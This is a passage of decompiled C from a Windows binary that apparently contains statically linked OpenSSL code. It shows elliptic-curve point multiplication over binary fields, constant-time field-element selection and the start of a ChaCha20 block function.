  v15 = a2[17];
  v16 = a2[18];
  v17 = a2[19];
  v60 = a2[16];
  v61 = v15;
  v62 = v16;
  v63 = v17;
  v18 = v17 | v16 | v15 | v60;
  v19 = a2[21];
  v20 = a2[22];
  v21 = a2[23];
  v64 = a2[20];
  v65 = v19;
  v66 = v20;
  v67 = v21;
  v91 = (int)(-(v21 | v20 | v19 | v64 | v18) | v21 | v20 | v19 | v64 | v18) >> 31;
  v22 = a3[1];
  v23 = a3[2];
  v24 = a3[3];
  v68 = *a3;
  v69 = v22;
  v70 = v23;
  v71 = v24;
  v25 = v24 | v23 | v22 | v68;
  v26 = a3[5];
  v27 = a3[6];
  v28 = a3[7];
  v72 = a3[4];
  v73 = v26;
  v74 = v27;
  v75 = v28;
  v29 = v28 | v27 | v26 | v72 | v25;
  v30 = a3[9];
  v31 = a3[10];
  v32 = a3[11];
  v76 = a3[8];
  v77 = v30;
  v78 = v31;
  v79 = v32;
  v33 = v32 | v31 | v30 | v76 | v29;
  v34 = a3[13];
  v35 = a3[14];
  v36 = a3[15];
  v80 = a3[12];
  v81 = v34;
  v82 = v35;
  v83 = v36;
  v92 = (int)(v36 | v35 | v34 | v80 | v33 | -(v36 | v35 | v34 | v80 | v33)) >> 31;
  sub_4A94B0(dword_73C6D0, &v60, v85, &v60);
  sub_4A94B0(v93, v85, v84, &v68);
  sub_4A94B0(v93, v85, v85, &v60);
  sub_4A9310((int)&v44, v86, (int)v84);
  sub_4A94B0(v93, v85, v85, &v76);
  sub_4A94B0(v93, v86, v43, &v60);
  sub_4A9310((int)&v52, v87, (int)v85);
  sub_4A94B0(v93, v86, v88, v86);
  sub_4A94B0(v93, v87, v90, v87);
  sub_4A94B0(v93, v88, v84, &v44);
  sub_4A94B0(v93, v88, v89, v86);
  sub_4A9220(v84, v88, v84);
  sub_4A9310((int)v88, v41, (int)v90);
  sub_4A9310((int)v89, v41, (int)v41);
  sub_4A9310((int)v41, v42, (int)v84);
  sub_4A94B0(v93, &v52, v85, v89);
  sub_4A94B0(v93, v42, v42, v87);
  sub_4A9310((int)v85, v42, (int)v42);
  v37 = v92 & v91;
  v38 = v92 & ~v91;
  v39 = ~v92;
  a1[16] = v60 & ~v92 | (unsigned __int8)v92 & (unsigned __int8)~(_BYTE)v91 & 1 | v43[0] & v92 & v91;
  a1[17] = v61 & v39 | v43[1] & v37;
  a1[18] = v62 & v39 | v43[2] & v37;
  a1[19] = v63 & v39 | v38 | v43[3] & v37;
  a1[20] = v64 & v39 | v38 | v43[4] & v37;
  a1[21] = v65 & v39 | v38 | v43[5] & v37;
  a1[22] = v66 & v39 | v38 & 0xFFFFFFFE | v43[6] & v37;
  a1[23] = v67 & v39 | v43[7] & v37;
  *a1 = v44 & v39 | v68 & v38 | v41[0] & v37;
  a1[1] = v45 & v39 | v69 & v38 | v41[1] & v37;
  a1[2] = v46 & v39 | v70 & v38 | v41[2] & v37;
  a1[3] = v47 & v39 | v71 & v38 | v41[3] & v37;
  a1[4] = v48 & v39 | v72 & v38 | v41[4] & v37;
  a1[5] = v49 & v39 | v73 & v38 | v41[5] & v37;
  a1[6] = v50 & v39 | v74 & v38 | v41[6] & v37;
  a1[7] = v51 & v39 | v75 & v38 | v41[7] & v37;
  a1[8] = v52 & v39 | v76 & v38 | v42[0] & v37;
  a1[9] = v53 & v39 | v77 & v38 | v42[1] & v37;
  a1[10] = v54 & v39 | v78 & v38 | v42[2] & v37;
  a1[11] = v55 & v39 | v79 & v38 | v42[3] & v37;
  a1[12] = v56 & v39 | v80 & v38 | v42[4] & v37;
  a1[13] = v57 & v39 | v81 & v38 | v42[5] & v37;
  a1[14] = v58 & v39 | v82 & v38 | v42[6] & v37;
  result = v59 & v39 | v83 & v38 | v42[7] & v37;
  a1[15] = result;
  return result;
}
// 73C6D0: using guessed type int dword_73C6D0;
// 4AAF20: using guessed type unsigned int var_DC[8];
// 4AAF20: using guessed type _DWORD var_FC[8];
// 4AAF20: using guessed type unsigned int var_BC[8];
// 4AAF20: using guessed type unsigned int var_9C[8];
// 4AAF20: using guessed type unsigned int var_7C[8];
// 4AAF20: using guessed type _DWORD var_3C[8];
// 4AAF20: using guessed type unsigned int var_5C[8];

//----- (004AB540) --------------------------------------------------------
int __usercall sub_4AB540@<eax>(_DWORD *a1@<ecx>, int *a2@<edi>, _DWORD *a3, int a4)
{
  _DWORD *v5; // ebx
  int v6; // esi
  int *v8; // [esp+0h] [ebp-14h]

  sub_420700(v8);
  v5 = sub_420790(a2);
  if ( !v5
    || !(*(int (__cdecl **)(_DWORD *, _DWORD *, _DWORD *, int *))(*a1 + 140))(a1, a3, a3, a2)
    || !(*(int (__cdecl **)(_DWORD *, _DWORD *, int, int *))(*a1 + 140))(a1, v5, a4, a2)
    || !(*(int (__cdecl **)(_DWORD *, int, _DWORD *, _DWORD *, int *))(*a1 + 136))(a1, a4, a3, v5, a2)
    || !(*(int (__cdecl **)(_DWORD *, _DWORD *, _DWORD *, int *))(*a1 + 140))(a1, a3, a3, a2)
    || !(*(int (__cdecl **)(_DWORD *, _DWORD *, _DWORD *, int *))(*a1 + 140))(a1, v5, v5, a2)
    || !(*(int (__cdecl **)(_DWORD *, _DWORD *, _DWORD, _DWORD *, int *))(*a1 + 136))(a1, v5, a1[17], v5, a2)
    || (v6 = 1, !sub_47FE90(a3, a3, v5)) )
  {
    v6 = 0;
  }
  sub_420750(a2);
  return v6;
}
// 4AB55C: variable 'v8' is possibly undefined

//----- (004AB630) --------------------------------------------------------
int __usercall sub_4AB630@<eax>(int a1@<ecx>, _DWORD *a2@<ebx>, int *a3@<esi>, _DWORD *a4, _DWORD *a5, int a6, int a7)
{
  int v8; // edi
  int *v10; // [esp+0h] [ebp-18h]
  _DWORD *v11; // [esp+Ch] [ebp-Ch]
  _DWORD *v12; // [esp+10h] [ebp-8h]

  sub_420700(v10);
  v11 = sub_420790(a3);
  v12 = sub_420790(a3);
  if ( !v12
    || !sub_4173E0(v11, a4)
    || !(*(int (__cdecl **)(int, _DWORD *, _DWORD *, int, int *))(*(_DWORD *)a1 + 136))(a1, a5, a5, a7, a3)
    || !(*(int (__cdecl **)(int, _DWORD *, _DWORD *, int, int *))(*(_DWORD *)a1 + 136))(a1, a2, a2, a6, a3)
    || !(*(int (__cdecl **)(int, _DWORD *, _DWORD *, _DWORD *, int *))(*(_DWORD *)a1 + 136))(a1, v12, a5, a2, a3)
    || !sub_47FE90(a2, a2, a5)
    || !(*(int (__cdecl **)(int, _DWORD *, _DWORD *, int *))(*(_DWORD *)a1 + 140))(a1, a2, a2, a3)
    || !(*(int (__cdecl **)(int, _DWORD *, _DWORD *, _DWORD *, int *))(*(_DWORD *)a1 + 136))(a1, a5, a2, v11, a3)
    || (v8 = 1, !sub_47FE90(a5, a5, v12)) )
  {
    v8 = 0;
  }
  sub_420750(a3);
  return v8;
}
// 4AB64B: variable 'v10' is possibly undefined

//----- (004AB750) --------------------------------------------------------
int __usercall sub_4AB750@<eax>(
        int a1@<ecx>,
        _DWORD *a2@<ebx>,
        int *a3@<edi>,
        _DWORD *a4,
        _DWORD *a5,
        _DWORD *a6,
        _DWORD *a7,
        _DWORD *a8)
{
  int result; // eax
  _DWORD *v10; // ebp
  _DWORD *v11; // eax
  int v12; // esi
  _DWORD *v13; // [esp+4h] [ebp-Ch]
  _DWORD *v14; // [esp+8h] [ebp-8h]

  if ( sub_416DB0((int)a7) )
  {
    sub_417490(a8, 0);
    sub_417490(a2, 0);
    return 1;
  }
  else if ( sub_416DB0((int)a2) )
  {
    result = (int)sub_4173E0(a8, a4);
    if ( result )
      return sub_47FE90(a2, a4, a5) != 0 ? 2 : 0;
  }
  else
  {
    sub_420700(a3);
    v10 = sub_420790(a3);
    v13 = sub_420790(a3);
    v11 = sub_420790(a3);
    v14 = v11;
    if ( !v11
      || !sub_417490(v11, 1)
      || !(*(int (__cdecl **)(int, _DWORD *, _DWORD *, _DWORD *, int *))(*(_DWORD *)a1 + 136))(a1, v10, a7, a2, a3)
      || !(*(int (__cdecl **)(int, _DWORD *, _DWORD *, _DWORD *, int *))(*(_DWORD *)a1 + 136))(a1, a7, a7, a4, a3)
      || !sub_47FE90(a7, a7, a6)
      || !(*(int (__cdecl **)(int, _DWORD *, _DWORD *, _DWORD *, int *))(*(_DWORD *)a1 + 136))(a1, a2, a2, a4, a3)
      || !(*(int (__cdecl **)(int, _DWORD *, _DWORD *, _DWORD *, int *))(*(_DWORD *)a1 + 136))(a1, a6, a2, a6, a3)
      || !sub_47FE90(a2, a2, a8)
      || !(*(int (__cdecl **)(int, _DWORD *, _DWORD *, _DWORD *, int *))(*(_DWORD *)a1 + 136))(a1, a2, a2, a7, a3)
      || !(*(int (__cdecl **)(int, _DWORD *, _DWORD *, int *))(*(_DWORD *)a1 + 140))(a1, v13, a4, a3)
      || !sub_47FE90(v13, v13, a5)
      || !(*(int (__cdecl **)(int, _DWORD *, _DWORD *, _DWORD *, int *))(*(_DWORD *)a1 + 136))(a1, v13, v13, v10, a3)
      || !sub_47FE90(v13, v13, a2)
      || !(*(int (__cdecl **)(int, _DWORD *, _DWORD *, _DWORD *, int *))(*(_DWORD *)a1 + 136))(a1, v10, v10, a4, a3)
      || !(*(int (__cdecl **)(int, _DWORD *, _DWORD *, _DWORD *, int *))(*(_DWORD *)a1 + 144))(a1, v10, v14, v10, a3)
      || !(*(int (__cdecl **)(int, _DWORD *, _DWORD *, _DWORD *, int *))(*(_DWORD *)a1 + 136))(a1, v13, v10, v13, a3)
      || !(*(int (__cdecl **)(int, _DWORD *, _DWORD *, _DWORD *, int *))(*(_DWORD *)a1 + 136))(a1, a8, a6, v10, a3)
      || !sub_47FE90(a2, a8, a4)
      || !(*(int (__cdecl **)(int, _DWORD *, _DWORD *, _DWORD *, int *))(*(_DWORD *)a1 + 136))(a1, a2, a2, v13, a3)
      || (v12 = 2, !sub_47FE90(a2, a2, a5)) )
    {
      v12 = 0;
    }
    sub_420750(a3);
    return v12;
  }
  return result;
}

//----- (004ABA30) --------------------------------------------------------
int __cdecl sub_4ABA30(_DWORD *a1, int a2, int a3, int a4, int *a5)
{
  _DWORD *v6; // esi
  _DWORD *v7; // edi
  _DWORD *v8; // ebx
  int v9; // eax
  int v10; // eax
  int v11; // eax
  int v12; // eax
  int v13; // esi
  int v14; // eax
  int v15; // eax
  int v16; // eax
  int v17; // eax
  int v18; // eax
  int v19; // eax
  unsigned int v20; // [esp+Ch] [ebp-20h]
  unsigned int v21; // [esp+Ch] [ebp-20h]
  _DWORD *v22; // [esp+10h] [ebp-1Ch]
  _DWORD *v23; // [esp+14h] [ebp-18h]
  _DWORD *v24; // [esp+18h] [ebp-14h]
  int v25; // [esp+1Ch] [ebp-10h]
  int v26; // [esp+20h] [ebp-Ch]
  int v27; // [esp+24h] [ebp-8h]
  int v28; // [esp+28h] [ebp-4h]

  v26 = 0;
  if ( a2 == a4 )
  {
    sub_408310(16, 208, 112, (int)"crypto\\ec\\ec2_mult.c", 230);
    return 0;
  }
  if ( a3 && !sub_416DB0(a3) && a4 && !sub_436430((int)a1, (_DWORD *)a4) )
  {
    if ( !*(_DWORD *)(a4 + 16) )
      return 0;
    sub_420700(a5);
    v6 = sub_420790(a5);
    v23 = v6;
    v22 = sub_420790(a5);
    if ( !v22 )
      goto LABEL_32;
    v7 = *(_DWORD **)(a2 + 4);
    v8 = *(_DWORD **)(a2 + 8);
    v24 = v7;
    v9 = sub_422350(a1[9]);
    sub_4173C0((int)v6, v9);
    v10 = sub_422350(a1[9]);
    sub_4173C0((int)v22, v10);
    v11 = sub_422350(a1[9]);
    sub_4173C0((int)v7, v11);
    v12 = sub_422350(a1[9]);
    sub_4173C0((int)v8, v12);
    if ( !sub_47FF20(v6, *(_DWORD **)(a4 + 4), a1 + 10)
      || !sub_417490(v22, 1)
      || !(*(int (__cdecl **)(_DWORD *, _DWORD *, _DWORD *, int *))(*a1 + 140))(a1, v8, v6, a5)
      || !(*(int (__cdecl **)(_DWORD *, _DWORD *, _DWORD *, int *))(*a1 + 140))(a1, v7, v8, a5)
      || !sub_47FE90(v7, v7, (_DWORD *)a1[17]) )
    {
      goto LABEL_32;
    }
    v13 = sub_422350(a3) - 1;
    v25 = v13;
    v20 = 0x80000000;
    v14 = *(_DWORD *)(sub_435D30(a3) + 4 * v13);
    if ( v14 >= 0 )
    {
      do
        v20 >>= 1;
      while ( (v14 & v20) == 0 );
    }
    v21 = v20 >> 1;
    if ( !v21 )
    {
      v25 = --v13;
      v21 = 0x80000000;
    }
    if ( v13 >= 0 )
    {
LABEL_20:
      v27 = *(_DWORD *)(sub_435D30(a3) + 4 * v13);
      while ( 1 )
      {
        v28 = v21 & v27;
        v15 = sub_422350(a1[9]);
        sub_416B80(v21 & v27, v23, v7, v15);
        v16 = sub_422350(a1[9]);
        sub_416B80(v21 & v27, v22, v8, v16);
        if ( !sub_4AB630((int)a1, v8, a5, *(_DWORD **)(a4 + 4), v7, (int)v23, (int)v22)
          || !sub_4AB540(a1, a5, v23, (int)v22) )
        {
          goto LABEL_32;
        }
        v17 = sub_422350(a1[9]);
        sub_416B80(v28, v23, v24, v17);
        v18 = sub_422350(a1[9]);
        sub_416B80(v28, v22, v8, v18);
        v7 = v24;
        v21 >>= 1;
        if ( !v21 )
        {
          v13 = v25 - 1;
          v21 = 0x80000000;
          v25 = v13;
          if ( v13 >= 0 )
            goto LABEL_20;
          break;
        }
      }
    }
    v19 = sub_4AB750((int)a1, v8, a5, *(_DWORD **)(a4 + 4), *(_DWORD **)(a4 + 8), v23, v22, v7);
    if ( v19 )
    {
      if ( v19 == 1 )
      {
        if ( sub_436120((int)a1, (_DWORD *)a2) )
          goto LABEL_31;
      }
      else if ( sub_417490(*(_DWORD **)(a2 + 12), 1) )
      {
        *(_DWORD *)(a2 + 16) = 1;
LABEL_31:
        sub_417390(*(_DWORD *)(a2 + 4), 0);
        sub_417390(*(_DWORD *)(a2 + 8), 0);
        v26 = 1;
      }
    }
LABEL_32:
    sub_420750(a5);
    return v26;
  }
  return sub_436120((int)a1, (_DWORD *)a2);
}
// 4ABC29: conditional instruction was optimized away because %var_20.4!=0

//----- (004ABDB0) --------------------------------------------------------
int __cdecl sub_4ABDB0(int *a1, _DWORD *a2, _DWORD *a3, unsigned int a4, int a5, int a6, int *a7)
{
  _DWORD *v7; // ebp
  int *v8; // edi
  unsigned int v10; // eax
  _DWORD *v11; // eax
  int *v12; // ebx
  int i; // eax
  _DWORD *Block; // [esp+8h] [ebp-10h]
  int v15; // [esp+Ch] [ebp-Ch]
  void **v16; // [esp+10h] [ebp-8h]
  int v17; // [esp+34h] [ebp+1Ch]

  v7 = 0;
  v8 = a7;
  v16 = 0;
  v15 = 0;
  Block = 0;
  if ( !a7 )
  {
    v16 = (void **)sub_420670();
    v8 = (int *)v16;
    if ( !v16 )
      return 0;
  }
  v10 = a4;
  if ( (!a3 || a4 <= 1) && a4 <= 2 )
  {
    if ( a4 || !sub_4366D0((int)a1) )
    {
      v7 = sub_435F90(a1);
      if ( v7 )
      {
        v11 = sub_435F90(a1);
        Block = v11;
        if ( v11 )
        {
          if ( sub_436120((int)a1, v11) )
          {
            if ( !a3
              || sub_4ABA30(a1, (int)v7, (int)a3, a1[1], v8)
              && (!sub_416E40((int)a3) || (*(int (__cdecl **)(int *, _DWORD *, int *))(*a1 + 100))(a1, v7, v8))
              && (*(int (__cdecl **)(int *, _DWORD *, _DWORD *, _DWORD *, int *))(*a1 + 92))(a1, Block, Block, v7, v8) )
            {
              v17 = 0;
              if ( a4 )
              {
                v12 = (int *)a6;
                for ( i = a5 - a6;
                      sub_4ABA30(a1, (int)v7, *v12, *(int *)((char *)v12 + i), v8)
                   && (!sub_416E40(*v12) || (*(int (__cdecl **)(int *, _DWORD *, int *))(*a1 + 100))(a1, v7, v8))
                   && (*(int (__cdecl **)(int *, _DWORD *, _DWORD *, _DWORD *, int *))(*a1 + 92))(
                        a1,
                        Block,
                        Block,
                        v7,
                        v8);
                      i = a5 - a6 )
                {
                  ++v12;
                  if ( ++v17 >= a4 )
                    goto LABEL_25;
                }
              }
              else
              {
LABEL_25:
                if ( sub_4360B0(a2, Block) )
                  v15 = 1;
              }
            }
          }
        }
      }
      goto LABEL_29;
    }
    v10 = 0;
  }
  v15 = sub_4577E0(a1, a2, a3, v10, a5, a6, (int)v8);
LABEL_29:
  sub_436040(v7);
  sub_436040(Block);
  sub_4206C0(v16);
  return v15;
}

//----- (004AC000) --------------------------------------------------------
char __cdecl sub_4AC000(__m128i *a1, const __m128i *a2, unsigned int a3, const __m128i *a4, const __m128i *a5)
{
  __int32 v6; // ebx
  __int32 v7; // ecx
  __int32 v8; // edx
  __int32 v9; // ebx
  __int32 v10; // ecx
  __int32 v11; // edx
  __int32 v12; // ebx
  __int32 v13; // ecx
  __int32 v14; // edx
  int v15; // eax
  __int32 v16; // ebp
  __int32 v17; // ecx
  __int32 v18; // esi
  __int32 v19; // edx
  int v20; // ebx
  __int32 v21; // eax
  int v22; // edx
  int v23; // ecx
  int v24; // ebx
  int v25; // edi
  int v26; // esi
  int v27; // ebp
  int v28; // edx
  int v29; // ecx
  int v30; // ebx
  __int32 v31; // edx
  int v32; // ecx
  int v33; // edi
  int v34; // esi
  int v35; // ebp
  int v36; // edi
  int v37; // esi
  int v38; // edx
  int v39; // ecx
  int v40; // ebx
  int v41; // edi
  int v42; // esi
  int v43; // ebp
  int v44; // edx
  int v45; // ecx
  int v46; // ebx
  __int32 v47; // edx
  int v48; // edi
  int v49; // esi
  int v50; // ebp
  __int32 v51; // edi
  unsigned int v52; // ebx
  __int32 v53; // ebp
  __int32 v54; // ecx
  __int32 v55; // esi
  int v56; // ebp
  int v57; // ecx
  int v58; // esi
  __int32 v59; // edx
  __int32 v60; // edi
  int v61; // ecx
  int v62; // esi
  __int32 v63; // edx
  __int32 v64; // edi
  __int32 v65; // ecx
  __int32 v66; // esi
  __int32 v67; // edx
  __int32 v68; // edi
  __int32 v69; // ebp
  int v70; // esi
  __int8 v71; // al
  char v72; // dl
  __m128i *v73; // edi
  const __m128i *v74; // esi
  unsigned int v75; // ecx
  const __m128i *v76; // edx
  __m128i v77; // xmm3
  unsigned int v78; // ecx
  __m128i v79; // xmm7
  __m128i v80; // xmm3
  __m128i si128; // xmm7
  const __m128i *v82; // esi
  __m128i *v83; // edi
  __m128i v84; // xmm2
  __m128i v85; // xmm3
  __m128i v86; // xmm5
  __m128i v87; // xmm6
  __m128i v88; // xmm7
  __m128i v89; // xmm3
  __m128i v90; // xmm5
  __m128i v91; // xmm6
  __m128i v92; // xmm7
  __m128i v93; // xmm4
  __m128i v94; // xmm0
  __m128i v95; // xmm6
  __m128i v96; // xmm3
  __m128i v97; // xmm4
  __m128i v98; // xmm5
  int v99; // edx
  __m128i v100; // xmm0
  __m128i v101; // xmm6
  __m128i v102; // xmm4
  __m128i v103; // xmm2
  __m128i v104; // xmm3
  __m128i v105; // xmm2
  __m128i v106; // xmm1
  __m128i v107; // xmm7
  __m128i v108; // xmm6
  __m128i v109; // xmm4
  __m128i v110; // xmm1
  __m128i v111; // xmm0
  __m128i v112; // xmm7
  __m128i v113; // xmm5
  __m128i v114; // xmm4
  __m128i v115; // xmm2
  __m128i v116; // xmm0
  __m128i v117; // xmm3
  __m128i v118; // xmm0
  __m128i v119; // xmm6
  __m128i v120; // xmm7
  __m128i v121; // xmm5
  __m128i v122; // xmm0
  __m128i v123; // xmm1
  __m128i v124; // xmm6
  __m128i v125; // xmm4
  __m128i v126; // xmm5
  __m128i v127; // xmm3
  __m128i v128; // xmm1
  __m128i v129; // xmm2
  __m128i v130; // xmm1
  __m128i v131; // xmm7
  __m128i v132; // xmm6
  __m128i v133; // xmm4
  __m128i v134; // xmm1
  __m128i v135; // xmm0
  __m128i v136; // xmm7
  __m128i v137; // xmm5
  __m128i v138; // xmm2
  __m128i v139; // xmm0
  __m128i v140; // xmm3
  __m128i v141; // xmm0
  __m128i v142; // xmm7
  __m128i v143; // xmm5
  __m128i v144; // xmm0
  __m128i v145; // xmm1
  __m128i v146; // xmm6
  __m128i v147; // xmm4
  __m128i v148; // xmm3
  __m128i v149; // xmm1
  __m128i v150; // xmm2
  __m128i v151; // xmm1
  __m128i v152; // xmm7
  __m128i v153; // xmm6
  __m128i v154; // xmm4
  __m128i v155; // xmm1
  __m128i v156; // xmm0
  __m128i v157; // xmm7
  __m128i v158; // xmm5
  __m128i v159; // xmm4
  __m128i v160; // xmm2
  __m128i v161; // xmm0
  __m128i v162; // xmm3
  __m128i v163; // xmm0
  __m128i v164; // xmm6
  __m128i v165; // xmm7
  __m128i v166; // xmm5
  __m128i v167; // xmm0
  __m128i v168; // xmm1
  __m128i v169; // xmm6
  __m128i v170; // xmm4
  __m128i v171; // xmm5
  __m128i v172; // xmm3
  __m128i v173; // xmm1
  __m128i v174; // xmm2
  __m128i v175; // xmm1
  __m128i v176; // xmm7
  __m128i v177; // xmm6
  __m128i v178; // xmm1
  __m128i v179; // xmm0
  __m128i v180; // xmm7
  __m128i v181; // xmm5
  __m128i v182; // xmm0
  __m128i v183; // xmm3
  __m128i v184; // xmm7
  __m128i v185; // xmm1
  __m128i v186; // xmm1
  __m128i v187; // xmm3
  __m128i v188; // xmm6
  __m128i v189; // xmm0
  __m128i v190; // xmm7
  __m128i v191; // xmm2
  __m128i v192; // xmm6
  __m128i v193; // xmm7
  __m128i v194; // xmm1
  __m128i v195; // xmm0
  __m128i v196; // xmm3
  __m128i v197; // xmm6
  __m128i v198; // xmm1
  __m128i v199; // xmm3
  __m128i v200; // xmm4
  __m128i v201; // xmm5
  __m128i v202; // xmm2
  __m128i v203; // xmm7
  const __m128i *v204; // esi
  __m128i v205; // xmm4
  __m128i v206; // xmm0
  __m128i v207; // xmm5
  __m128i v208; // xmm1
  __m128i v209; // xmm6
  __m128i v210; // xmm2
  __m128i v211; // xmm7
  __m128i v212; // xmm3
  __m128i *v213; // edi
  __m128i v214; // xmm1
  __m128i v215; // xmm3
  __m128i v216; // xmm6
  __m128i v217; // xmm0
  __m128i v218; // xmm7
  __m128i v219; // xmm2
  __m128i v220; // xmm6
  __m128i v221; // xmm7
  __m128i v222; // xmm1
  __m128i v223; // xmm0
  __m128i v224; // xmm3
  __m128i v225; // xmm6
  __m128i v226; // xmm1
  __m128i v227; // xmm3
  __m128i v228; // xmm4
  __m128i v229; // xmm5
  __m128i v230; // xmm2
  __m128i v231; // xmm7
  __m128i v232; // xmm4
  __m128i v233; // xmm0
  __m128i v234; // xmm5
  __m128i v235; // xmm1
  __m128i v236; // xmm6
  __m128i v237; // xmm2
  __m128i v238; // xmm7
  __m128i v239; // xmm3
  __m128i v240; // xmm1
  __m128i v241; // xmm3
  __m128i v242; // xmm6
  __m128i v243; // xmm0
  __m128i v244; // xmm7
  __m128i v245; // xmm2
  __m128i v246; // xmm6
  __m128i v247; // xmm7
  __m128i v248; // xmm1
  __m128i v249; // xmm0
  __m128i v250; // xmm3
  __m128i v251; // xmm6
  __m128i v252; // xmm1
  __m128i v253; // xmm3
  __m128i v254; // xmm4
  __m128i v255; // xmm5
  __m128i v256; // xmm2
  __m128i v257; // xmm7
  __m128i v258; // xmm4
  __m128i v259; // xmm0
  __m128i v260; // xmm5
  __m128i v261; // xmm1
  __m128i v262; // xmm6
  __m128i v263; // xmm2
  __m128i v264; // xmm7
  __m128i v265; // xmm3
  __m128i v266; // xmm1
  __m128i v267; // xmm3
  __m128i v268; // xmm6
  __m128i v269; // xmm0
  __m128i v270; // xmm7
  __m128i v271; // xmm2
  __m128i v272; // xmm6
  __m128i v273; // xmm7
  __m128i v274; // xmm1
  __m128i v275; // xmm0
  __m128i v276; // xmm3
  __m128i v277; // xmm6
  __m128i v278; // xmm1
  __m128i v279; // xmm3
  __m128i v280; // xmm4
  __m128i v281; // xmm5
  __m128i v282; // xmm2
  __m128i v283; // xmm7
  bool v284; // cf
  __m128i v285; // xmm0
  __m128i v286; // xmm1
  __m128i v287; // xmm2
  __m128i v288; // xmm6
  __m128i v289; // xmm7
  int i; // edx
  __m128i v291; // xmm0
  __m128i v292; // xmm3
  __m128i v293; // xmm2
  __m128i v294; // xmm4
  __m128i v295; // xmm1
  __m128i v296; // xmm0
  __m128i v297; // xmm3
  __m128i v298; // xmm2
  __m128i v299; // xmm4
  __m128i v300; // xmm1
  __m128i v301; // xmm0
  __m128i v302; // xmm3
  __m128i v303; // xmm2
  __m128i v304; // xmm4
  __m128i v305; // xmm1
  __m128i v306; // xmm3
  __m128i v307; // xmm2
  __m128i v308; // xmm4
  __m128i v309; // xmm0
  __m128i v310; // xmm1
  __m128i v311; // xmm2
  __m128i v312; // xmm3
  __m128i v313; // xmm0
  __m128i v314; // xmm1
  __m128i v315; // xmm2
  __m128i v316; // xmm3
  int v317; // ebp
  __int8 v318; // al
  __int8 v319; // dl
  const __m128i *v321; // esi
  unsigned int v322; // ecx
  unsigned int v326; // ecx
  const __m128i *v350; // esi
  int v370; // edx
  int v578; // edx
  int v614; // ebp
  __int8 v615; // al
  __int8 v616; // dl
  __m128i v618; // [esp+0h] [ebp-21Ch] BYREF
  __m128i v619; // [esp+10h] [ebp-20Ch] BYREF
  __m128i v620; // [esp+20h] [ebp-1FCh] BYREF
  __m128i v621; // [esp+30h] [ebp-1ECh] BYREF
  __m128i v622; // [esp+40h] [ebp-1DCh] BYREF
  __m128i v623; // [esp+50h] [ebp-1CCh] BYREF
  __m128i v624; // [esp+60h] [ebp-1BCh] BYREF
  __m128i v625; // [esp+70h] [ebp-1ACh] BYREF
  __m128i v626; // [esp+80h] [ebp-19Ch] BYREF
  __m128i v627; // [esp+90h] [ebp-18Ch] BYREF
  __m128i v628; // [esp+A0h] [ebp-17Ch] BYREF
  __m128i v629; // [esp+B0h] [ebp-16Ch] BYREF
  __m128i v630; // [esp+C0h] [ebp-15Ch] BYREF
  __m128i v631; // [esp+D0h] [ebp-14Ch] BYREF
  __m128i v632; // [esp+E0h] [ebp-13Ch] BYREF
  __m128i v633; // [esp+F0h] [ebp-12Ch] BYREF
  __m128i v634; // [esp+100h] [ebp-11Ch] BYREF
  __m128i v635; // [esp+110h] [ebp-10Ch] BYREF
  __m128i v636; // [esp+120h] [ebp-FCh] BYREF
  __m128i v637; // [esp+130h] [ebp-ECh] BYREF
  __m128i v638; // [esp+140h] [ebp-DCh] BYREF
  __m128i v639; // [esp+150h] [ebp-CCh] BYREF
  __m128i v640; // [esp+160h] [ebp-BCh] BYREF
  __m128i v641; // [esp+170h] [ebp-ACh] BYREF
  _BYTE v642[32]; // [esp+180h] [ebp-9Ch] BYREF
  __m128i v643; // [esp+1A0h] [ebp-7Ch] BYREF
  __m128i v644; // [esp+1B0h] [ebp-6Ch] BYREF
  __m128i v645; // [esp+1C0h] [ebp-5Ch] BYREF
  __m128i v646; // [esp+1D0h] [ebp-4Ch] BYREF
  __m128i v647; // [esp+1E0h] [ebp-3Ch] BYREF
  __m128i v648; // [esp+1F0h] [ebp-2Ch] BYREF
  unsigned __int64 v649; // [esp+200h] [ebp-1Ch]
  const __m128i *v650; // [esp+208h] [ebp-14h]
  _BYTE v651[16]; // [esp+20Ch] [ebp-10h] BYREF

  LOBYTE(_EAX) = 0;
  if ( !a3 )
    return (char)_EAX;
  v650 = (const __m128i *)&loc_4AC015;
  if ( (dword_73C6D0 & 0x1000000) == 0 || (*(&dword_73C6D0 + 1) & 0x200) == 0 )
  {
    v6 = a4->m128i_i32[1];
    v7 = a4->m128i_i32[2];
    v8 = a4->m128i_i32[3];
    v646.m128i_i32[2] = a4->m128i_i32[0];
    v646.m128i_i32[3] = v6;
    v647.m128i_i64[0] = __PAIR64__(v8, v7);
    v9 = a4[1].m128i_i32[1];
    v10 = a4[1].m128i_i32[2];
    v11 = a4[1].m128i_i32[3];
    v647.m128i_i32[2] = a4[1].m128i_i32[0];
    v647.m128i_i32[3] = v9;
    v648.m128i_i64[0] = __PAIR64__(v11, v10);
    v12 = a5->m128i_i32[1];
    v13 = a5->m128i_i32[2];
    v14 = a5->m128i_i32[3];
    v648.m128i_i32[2] = a5->m128i_i32[0] - 1;
    v648.m128i_i32[3] = v12;
    v649 = __PAIR64__(v14, v13);
    while ( 1 )
    {
      v15 = 1634760805;
      qmemcpy(&v642[12], "nd 32-byte k", 12);
      *(_DWORD *)&v642[28] = v646.m128i_i32[3];
      v643.m128i_i64[0] = v647.m128i_i64[0];
      v644.m128i_i64[0] = v648.m128i_i64[0];
      v644.m128i_i32[3] = v648.m128i_i32[3];
      v645.m128i_i64[0] = v649;
      v16 = v646.m128i_i32[2];
      v18 = v647.m128i_i32[3];
      v17 = v647.m128i_i32[2];
      v19 = ++v648.m128i_i32[2];
      v20 = 10;
      do
      {
        v21 = v16 + v15;
        v650 = (const __m128i *)v20;
        v22 = __ROL4__(v21 ^ v19, 16);
        v23 = v22 + v17;
        v24 = __ROL4__(v23 ^ v16, 12);
        *(_DWORD *)&v642[8] = v24 + v21;
        v644.m128i_i32[2] = __ROL4__((v24 + v21) ^ v22, 8);
        v643.m128i_i32[2] = v644.m128i_i32[2] + v23;
        v25 = __ROL4__((*(_DWORD *)&v642[28] + *(_DWORD *)&v642[12]) ^ v644.m128i_i32[3], 16);
        *(_DWORD *)&v642[24] = __ROL4__((v644.m128i_i32[2] + v23) ^ v24, 7);
        v26 = v25 + v18;
        v27 = __ROL4__(v26 ^ *(_DWORD *)&v642[28], 12);
        *(_DWORD *)&v642[12] += v27 + *(_DWORD *)&v642[28];
        v644.m128i_i32[3] = __ROL4__(*(_DWORD *)&v642[12] ^ v25, 8);
        v643.m128i_i32[3] = v644.m128i_i32[3] + v26;
